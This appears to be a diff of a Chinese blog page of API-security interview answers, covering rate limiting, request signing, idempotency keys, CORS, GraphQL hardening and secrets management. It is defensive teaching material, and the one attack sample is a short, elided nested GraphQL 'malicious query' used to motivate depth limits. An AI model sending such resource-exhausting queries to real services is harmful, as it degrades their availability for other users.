+<li>适合：需要精确窗口限制的场景</li>
+</ul>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Redis Lua 滑动窗口</span></span><br><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> window_ms = <span class="built_in">tonumber</span>(ARGV[<span class="number">1</span>])  <span class="comment">-- 窗口大小 (ms)</span></span><br><span class="line"><span class="keyword">local</span> max_reqs = <span class="built_in">tonumber</span>(ARGV[<span class="number">2</span>])   <span class="comment">-- 窗口内最大请求数</span></span><br><span class="line"><span class="keyword">local</span> now = <span class="built_in">tonumber</span>(ARGV[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">local</span> window_start = now - window_ms</span><br><span class="line"></span><br><span class="line">redis.call(<span class="string">&#x27;ZREMRANGEBYSCORE&#x27;</span>, key, <span class="number">0</span>, window_start)</span><br><span class="line"><span class="keyword">local</span> current = redis.call(<span class="string">&#x27;ZCARD&#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> current &gt;= max_reqs <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>  <span class="comment">-- 拒绝</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">redis.call(<span class="string">&#x27;ZADD&#x27;</span>, key, now, now .. <span class="string">&#x27;:&#x27;</span> .. <span class="built_in">math</span>.<span class="built_in">random</span>())</span><br><span class="line">redis.call(<span class="string">&#x27;EXPIRE&#x27;</span>, key, <span class="built_in">math</span>.<span class="built_in">ceil</span>(window_ms / <span class="number">1000</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>  <span class="comment">-- 允许</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>生产建议：</strong></p>
+<ul>
+<li><strong>Redis Lua 脚本</strong>保证原子性，避免竞态条件</li>
+<li><strong>分层限流</strong>：全局限流 + 用户级限流 + IP 级限流</li>
+<li><strong>HTTP 响应头</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X-RateLimit-Limit: 100</span><br><span class="line">X-RateLimit-Remaining: 87</span><br><span class="line">X-RateLimit-Reset: 1686546000</span><br><span class="line">Retry-After: 45</span><br></pre></td></tr></table></figure></li>
+<li><strong>限流响应状态码</strong>：返回 <code>429 Too Many Requests</code></li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>分布式限流的挑战</strong>：多实例部署下，本地限流（in-memory）无法保证全局一致。Redis 集中式限流增加一次网络往返，在高 QPS 下可能成为瓶颈。解决方案：使用 Redis Cluster、本地 + 集中式两级限流。</li>
+<li><strong>精确度与性能的权衡</strong>：Sliding Window Log 最精确但存储开销大。Token Bucket 是最实用的折中方案。实际生产中可以接受 5-10% 的误差，用 Sliding Window Counter 替代 Log。</li>
+<li><strong>限流的”公平性”</strong>：不做公平的限流会导致”贪婪客户端”抢占资源。使用 Token Bucket 的每用户队列、或者 Weighted Fair Queuing 算法可以解决。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>Redis Rate Limiting Patterns: <a target="_blank" rel="noopener" href="https://redis.io/docs/latest/develop/use-cases/rate-limiter/">https://redis.io/docs/latest/develop/use-cases/rate-limiter/</a></li>
+<li>IETF RFC 6585 (429 Too Many Requests)</li>
+</ul>
+<h3 id="Q19：API-输入校验与请求签名"><a href="#Q19：API-输入校验与请求签名" class="headerlink" title="Q19：API 输入校验与请求签名"></a>Q19：API 输入校验与请求签名</h3><p><strong>标准答案</strong></p>
+<p><strong>输入校验（Input Validation）：</strong></p>
+<ol>
+<li><p><strong>JSON Schema 校验</strong>：对复杂 JSON Payload 使用 Schema 验证</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$schema&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://json-schema.org/draft-07/schema#&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;email&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span>   <span class="punctuation">&#123;</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;minimum&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> <span class="attr">&quot;maximum&quot;</span><span class="punctuation">:</span> <span class="number">150</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span>  <span class="punctuation">&#123;</span> <span class="attr">&quot;enum&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">]</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;email&quot;</span><span class="punctuation">,</span> <span class="string">&quot;age&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>白名单校验</strong>：定义可接受的输入集合，拒绝不在白名单中的值</p>
+</li>
+<li><p><strong>数据类型转换</strong>：明确指定接收的数据类型，不依赖隐式转换</p>
+</li>
+<li><p><strong>参数化查询</strong>：数据库查询使用参数化，不与字符串拼接</p>
+</li>
+</ol>
+<p><strong>请求签名（Request Signing）：</strong></p>
+<ol>
+<li><p><strong>HMAC 签名（对称）</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/transfer</span><br><span class="line"><span class="attribute">X-Signature</span><span class="punctuation">: </span>sha256=base64(hmac_sha256(secret, body + timestamp + nonce))</span><br><span class="line"><span class="attribute">X-Timestamp</span><span class="punctuation">: </span>1686546000</span><br><span class="line"><span class="attribute">X-Nonce</span><span class="punctuation">: </span>7b8a9d0e</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>优点</strong>：简单、高性能</li>
+<li><strong>缺点</strong>：需要共享密钥</li>
+</ul>
+</li>
+<li><p><strong>JWS（JSON Web Signature，非对称）</strong>：</p>
+<ul>
+<li>使用私钥签名，公钥验证</li>
+<li><strong>优点</strong>：无需共享密钥，适合开放 API</li>
+</ul>
+</li>
+<li><p><strong>AWS Signature V4（请求级签名）</strong>：</p>
+<ul>
+<li>基于 HMAC-SHA256，包含请求参数、header、payload</li>
+<li>防重放（通过 timestamp + 限定有效期）</li>
+<li>防篡改（签名涵盖请求的每一个部分）</li>
+</ul>
+</li>
+</ol>
+<p><strong>请求签名核心要素：</strong></p>
+<ul>
+<li><strong>Timestamp</strong>：防止重放攻击（有效期通常 5-15 分钟）</li>
+<li><strong>Nonce</strong>：同一 timestamp 内防重放</li>
+<li><strong>Body Hash</strong>：确保请求体不被篡改</li>
+<li><strong>Signing Key 派生</strong>：AWS SigV4 方式，避免直接暴露 master key</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>输入校验 vs XSS 过滤</strong>：输入校验是”检查数据格式和业务规则”，XSS 过滤是”输出编码”。不要在输入层做 XSS 过滤（破坏数据完整性，且不知道最终输出上下文是 HTML&#x2F;JS&#x2F;URL）。</li>
+<li><strong>JSON Schema 的局限性</strong>：Schema 不能做业务逻辑验证（”订单金额不能超过账户余额”），需要业务层二次校验。</li>
+<li><strong>请求签名的场景</strong>：支付回调（Webhook）、开放 API 网关、服务间通信。对于内部服务间通信，mTLS + 零信任架构可能优于请求签名。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>JWS RFC 7515</li>
+<li>AWS Signature V4 文档</li>
+<li>JSON Schema: <a target="_blank" rel="noopener" href="https://json-schema.org/">https://json-schema.org/</a></li>
+</ul>
+<h3 id="Q20：API-幂等性（Idempotency-Key）"><a href="#Q20：API-幂等性（Idempotency-Key）" class="headerlink" title="Q20：API 幂等性（Idempotency-Key）"></a>Q20：API 幂等性（Idempotency-Key）</h3><p><strong>标准答案</strong></p>
+<p><strong>问题</strong>：网络不稳定时客户端可能重发同一请求，导致重复扣款、重复下单等严重后果。</p>
+<p><strong>幂等性方案（Idempotency-Key）：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /api/payments</span><br><span class="line"><span class="attribute">Idempotency-Key</span><span class="punctuation">: </span>550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>
+
+<p><strong>工作原理：</strong></p>
+<ol>
+<li>客户端为每个”可能重试的操作”生成唯一 UUID</li>
+<li>服务器首次收到请求时，处理并存储结果（key → result）</li>
+<li>服务器收到重复请求时，直接返回已存储的结果，不重复处理</li>
+<li>存储在 Redis 中，配置 TTL（通常 24-72 小时）</li>
+</ol>
+<p><strong>幂等性分级（从弱到强）：</strong></p>
+<ul>
+<li><strong>等幂的</strong>：GET、PUT、DELETE（HTTP 语义上等幂）</li>
+<li><strong>非等幂的</strong>：POST（需要 Idempotency-Key 实现等幂）</li>
+<li><strong>自然等幂</strong>：请求本身已经包含了唯一约束（如订单号作为 primary key），重复插入会失败</li>
+</ul>
+<p><strong>实现要点：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_payment</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.headers.get(<span class="string">&#x27;Idempotency-Key&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">400</span>, <span class="string">&quot;Idempotency-Key required&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查幂等性缓存</span></span><br><span class="line">    <span class="keyword">if</span> redis.exists(<span class="string">f&quot;idempotency:<span class="subst">&#123;key&#125;</span>&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">200</span>, redis.get(<span class="string">f&quot;idempotency:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 Redis SETNX 防并发</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> redis.setnx(<span class="string">f&quot;idempotency:lock:<span class="subst">&#123;key&#125;</span>&quot;</span>, <span class="string">&quot;1&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">409</span>, <span class="string">&quot;Request in progress&quot;</span>  <span class="comment"># 重复创建了两次</span></span><br><span class="line">    </span><br><span class="line">    redis.expire(<span class="string">f&quot;idempotency:lock:<span class="subst">&#123;key&#125;</span>&quot;</span>, <span class="number">5</span>)  <span class="comment"># 5秒锁超时</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = process_payment(request)</span><br><span class="line">        redis.setex(<span class="string">f&quot;idempotency:<span class="subst">&#123;key&#125;</span>&quot;</span>, <span class="number">86400</span>, result)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">200</span>, result</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        redis.delete(<span class="string">f&quot;idempotency:lock:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>幂等键的冲突</strong>：两个不同操作用了同一个 Idempotency-Key。解决方案：key 的范围内限定资源 ID（如 <code>payment:order_123:550e8400</code>）。</li>
+<li><strong>500 错误也需要缓存</strong>：如果第一次请求返回 500 且未被缓存，第二次请求还是同一个 key 时，是否重新处理？Stripe 的做法是：返回 500 也会缓存，后续重试返回同样的 500。但最好让客户端生成新 key 重试。</li>
+<li><strong>Redis 锁与 SETNX</strong>：上述实现中用了分布式锁防并发，但锁超时可能太短或过长。更好的方案是使用 Redis Watch + Transaction。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>IETF Draft: Idempotency-Key HTTP Header Field</li>
+<li>Stripe Idempotent Requests 文档</li>
+<li><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/">https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/</a></li>
+</ul>
+<h3 id="Q21：CORS（跨域资源共享）"><a href="#Q21：CORS（跨域资源共享）" class="headerlink" title="Q21：CORS（跨域资源共享）"></a>Q21：CORS（跨域资源共享）</h3><p><strong>标准答案</strong></p>
+<p><strong>同源策略</strong>：浏览器安全基础机制，限制一个 origin 的脚本访问另一个 origin 的资源。”同源”定义：协议 + 域名 + 端口全部相同。</p>
+<p><strong>CORS 工作原理</strong>：服务器通过 HTTP 头部告诉浏览器允许什么跨域请求。</p>
+<p><strong>关键 Header：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted-app.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>Authorization, Content-Type</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Max-Age</span><span class="punctuation">: </span>86400</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Origin</span><br></pre></td></tr></table></figure>
+
+<p><strong>预检请求（Preflight）</strong>：</p>
+<ul>
+<li><p>当请求满足以下<strong>任一</strong>条件时，浏览器先发 OPTIONS 预检请求：</p>
+<ul>
+<li>使用 GET&#x2F;POST&#x2F;HEAD 之外的 HTTP 方法</li>
+<li>使用了非简单请求的 header（如 <code>Authorization</code>、<code>X-Custom-Header</code>）</li>
+<li>POST 的 Content-Type 不是 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code> 或 <code>text/plain</code></li>
+<li>使用了 <code>withCredentials: true</code> 且带有非简单请求 header</li>
+</ul>
+</li>
+<li><p>预检响应缓存：<code>Access-Control-Max-Age</code> 指定缓存秒数（减少 OPTIONS 请求）</p>
+</li>
+</ul>
+<p><strong>credentials 模式</strong>：当请求需要携带 cookie&#x2F;认证信息时：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted-app.com  # 不能为 *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>Access-Control-Allow-Origin</code> 不能为 <code>*</code></li>
+</ul>
+<p><strong>生产最佳实践：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx 配置 - 动态 CORS</span></span><br><span class="line"><span class="attribute">map</span> <span class="variable">$http_origin</span> <span class="variable">$cors_origin</span> &#123;</span><br><span class="line">    ~^https://(app|api)\.example\.com$ $http_origin;</span><br><span class="line">    <span class="attribute">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> /api/ &#123;</span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$cors_origin</span>) &#123;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Origin <span class="variable">$cors_origin</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">&quot;GET, POST, PUT, DELETE, OPTIONS&quot;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">&quot;Authorization, Content-Type, Idempotency-Key&quot;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Credentials <span class="string">&quot;true&quot;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Max-Age <span class="string">&quot;86400&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$request_method</span> = OPTIONS) &#123;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">204</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>CORS 不是 CSRF 防御</strong>：CORS 控制是否可以读取响应，不能阻止请求被发出。CSRF 防御阻止的是”发送更改状态的请求”。</li>
+<li><strong>CORS 通配符陷阱</strong>：<code>Access-Control-Allow-Origin: *</code> 会允许任何网站读取 API 响应。生产环境必须明确指定允许的 origin。</li>
+<li><strong>反向代理场景</strong>：如果 Nginx&#x2F;API Gateway 代理前端请求到后端，CORS 配置通常在网关层，后端 API 不需要关注 CORS。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>MDN CORS: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></li>
+<li>Fetch Living Standard: CORS Protocol</li>
+</ul>
+<h3 id="Q22：GraphQL-安全"><a href="#Q22：GraphQL-安全" class="headerlink" title="Q22：GraphQL 安全"></a>Q22：GraphQL 安全</h3><p><strong>标准答案</strong></p>
+<p>GraphQL 的灵活性带来了独特的安全挑战：<strong>N+1 查询炸弹</strong>、<strong>深度嵌套 DoS</strong>、<strong>字段爆破</strong>。</p>
+<p><strong>三大防御手段：</strong></p>
+<ol>
+<li><p><strong>Query Depth Limit（查询深度限制）</strong>：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恶意查询 - 深度爆炸</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  users <span class="punctuation">&#123;</span> posts <span class="punctuation">&#123;</span> comments <span class="punctuation">&#123;</span> author <span class="punctuation">&#123;</span> posts <span class="punctuation">&#123;</span> comments <span class="punctuation">&#123;</span> <span class="punctuation">...</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// graphql-depth-limit</span></span><br><span class="line"><span class="keyword">const</span> depthLimit = <span class="built_in">require</span>(<span class="string">&#x27;graphql-depth-limit&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/graphql&#x27;</span>, <span class="title function_">graphqlHTTP</span>(&#123;</span><br><span class="line">  schema,</span><br><span class="line">  <span class="attr">validationRules</span>: [<span class="title function_">depthLimit</span>(<span class="number">10</span>)],  <span class="comment">// 最大深度 10</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Query Cost Analysis（查询成本分析）</strong>：<br>为每个字段分配成本权重，拒绝超过预算的查询。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为字段配置成本</span></span><br><span class="line"><span class="keyword">const</span> schema = <span class="keyword">new</span> <span class="title class_">GraphQLSchema</span>(&#123;</span><br><span class="line">  <span class="attr">query</span>: <span class="keyword">new</span> <span class="title class_">GraphQLObjectType</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Query&#x27;</span>,</span><br><span class="line">    <span class="attr">fields</span>: &#123;</span><br><span class="line">      <span class="attr">users</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="keyword">new</span> <span class="title class_">GraphQLList</span>(<span class="title class_">UserType</span>),</span><br><span class="line">        <span class="attr">extensions</span>: &#123; <span class="attr">cost</span>: &#123; <span class="attr">complexity</span>: <span class="number">5</span> &#125; &#125;,  <span class="comment">// 基础成本 5</span></span><br><span class="line">        <span class="attr">resolve</span>: connectionResolver</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">user</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="title class_">UserType</span>,</span><br><span class="line">        <span class="attr">args</span>: &#123; <span class="attr">id</span>: &#123; <span class="attr">type</span>: <span class="title class_">GraphQLID</span> &#125; &#125;,</span><br><span class="line">        <span class="attr">extensions</span>: &#123; <span class="attr">cost</span>: &#123; <span class="attr">complexity</span>: <span class="number">1</span> &#125; &#125;,</span><br><span class="line">        <span class="attr">resolve</span>: singleUserResolver</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拒绝成本 &gt; 1000 的查询</span></span><br><span class="line"><span class="keyword">const</span> costAnalyzer = <span class="title function_">createCostAnalyzer</span>(&#123; <span class="attr">maxCost</span>: <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Persisted Queries（持久化查询）</strong>：<br>客户端预注册查询，服务端只接受注册过的查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">优点：彻底消除恶意查询、减少请求大小</span><br><span class="line">缺点：失去了 GraphQL 动态查询的灵活性</span><br><span class="line">最佳实践：在公共 API 使用持久化查询 + 内部管理用动态查询</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>其他防御策略：</strong></p>
+<ul>
+<li><strong>速率限制</strong>：对查询的复杂度而非请求数做限流</li>
+<li><strong>超时控制</strong>：设置单个查询的最大执行时间</li>
+<li><strong>Batch Limiting</strong>：限制 <code>first</code>&#x2F;<code>last</code> 参数的最大值（分页防御）</li>
+<li><strong>Alias 限制</strong>：防止通过别名重复请求同一字段</li>
+<li><strong>Introspection 关闭</strong>：生产环境关闭 Schema Introspection（除非有管理界面）</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Depth vs Cost</strong>：Depth limit 只能防嵌套 DoS，不能防宽度攻击（同层级请求 100 个字段）。Cost analysis 更全面，但需要仔细配置每个字段的复杂度。</li>
+<li><strong>DataLoader + N+1</strong>：即使客户端没有恶意查询，GraphQL 的 N+1 问题也会导致性能问题。DataLoader（批处理 + 缓存）是解决 N+1 的标准方案，同时也是安全防御——防止客户端无意中触发的性能问题。</li>
+<li><strong>Persisted Queries + CDN 缓存</strong>：持久化查询可以用 GET 请求提交（<code>?operationName=...&amp;variables=...</code>），这样 CDN 可以缓存查询结果，显著提升性能。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>GraphQL Armor: <a target="_blank" rel="noopener" href="https://github.com/Escape-Technologies/graphql-armor">https://github.com/Escape-Technologies/graphql-armor</a></li>
+<li>Apollo Server Security Docs</li>
+<li>“Securing Your GraphQL API” by Escape.tech</li>
+</ul>
+<hr>
+<h2 id="0x04-密钥与凭据管理"><a href="#0x04-密钥与凭据管理" class="headerlink" title="0x04 密钥与凭据管理"></a>0x04 密钥与凭据管理</h2><h3 id="Q23：密钥管理系统（HashiCorp-Vault-AWS-KMS-本地方案）"><a href="#Q23：密钥管理系统（HashiCorp-Vault-AWS-KMS-本地方案）" class="headerlink" title="Q23：密钥管理系统（HashiCorp Vault &#x2F; AWS KMS &#x2F; 本地方案）"></a>Q23：密钥管理系统（HashiCorp Vault &#x2F; AWS KMS &#x2F; 本地方案）</h3><p><strong>标准答案</strong></p>
+<p><strong>三类方案对比：</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>HashiCorp Vault</th>
+<th>AWS KMS &#x2F; Secrets Manager</th>
+<th>本地方案（git-crypt &#x2F; SOPS）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>类型</strong></td>
+<td>集中式 secrets 管理</td>
+<td>云托管 KMS&#x2F;secrets</td>
+<td>文件级加密</td>
+</tr>
+<tr>
+<td><strong>动态密钥</strong></td>
+<td>支持（动态数据库凭证）</td>
+<td>支持（自动轮换）</td>
+<td>不支持</td>
+</tr>
+<tr>
+<td><strong>审计</strong></td>
+<td>完善</td>
+<td>完善（CloudTrail）</td>
+<td>有限</td>
+</tr>
+<tr>
+<td><strong>部署复杂度</strong></td>
+<td>高</td>
+<td>低（托管服务）</td>
+<td>低</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td>多云&#x2F;混合云、复杂策略</td>
+<td>单一云、Serverless</td>
+<td>小型项目、配置文件</td>
+</tr>
+</tbody></table>
+<p><strong>HashiCorp Vault 核心特性：</strong></p>
+<ul>
+<li><strong>动态 Secrets</strong>：应用请求数据库密码时，Vault 动态创建临时用户，TTL 到期自动删除</li>
+<li><strong>加密即服务（Encryption as a Service）</strong>：应用调用 Vault 加密数据，无需管理密钥</li>
+<li><strong>多认证后端</strong>：Token、Kubernetes Service Account、AWS IAM、LDAP</li>
+<li><strong>Secret Engines</strong>：KV、数据库、AWS、PKI、SSH</li>
+<li><strong>Auto-unseal</strong>：和云 KMS 集成自动解封</li>
+</ul>
+<p><strong>AWS KMS 核心能力：</strong></p>
+<ul>
+<li>托管密钥生成、存储和轮换</li>
+<li>信封加密（Envelope Encryption）：数据密钥加密数据，主密钥加密数据密钥</li>
+<li>与 AWS 服务原生集成（S3、Lambda、DynamoDB）</li>
+</ul>
+<p><strong>本地方案（HashiCorp Vault 的轻量替代）：</strong></p>
+<ul>
+<li><strong>git-crypt</strong>：用 Git 进行透明加密，适合配置文件</li>
+<li><strong>SOPS（Mozilla SOPS）</strong>：加密 YAML&#x2F;JSON&#x2F;ENV 文件，支持 PGP&#x2F;AWS KMS&#x2F;GCP KMS</li>
+<li><strong>环境变量 + 加密存储</strong>：<code>.env</code> 文件做基础 secrets 管理</li>
+</ul>
+<p><strong>选择建议：</strong></p>
+<ul>
+<li><strong>Kubernetes 部署的分布式系统</strong> → Vault（Operator + CSI Provider）</li>
